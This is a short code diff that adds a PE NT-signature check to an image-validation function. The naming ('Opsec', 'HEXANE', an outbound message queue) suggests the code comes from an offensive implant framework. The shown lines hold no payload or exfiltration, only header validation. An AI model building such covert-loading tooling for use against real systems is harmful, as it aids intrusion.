@@ -167,12 +167,15 @@ namespace Opsec {
         Message::OutboundQueue(Outbound);
 
     defer:
-
     }
 
     VOID SeImageCheck(PIMAGE img, PIMAGE proc) {
         HEXANE
 
+        if (img->ntHead->Signature != IMAGE_NT_SIGNATURE) {
+            ntstatus = ERROR_INVALID_EXE_SIGNATURE;
+            return;
+        }
         if (proc->ntHead->FileHeader.Machine != img->ntHead->FileHeader.Machine) {
             ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
             return;
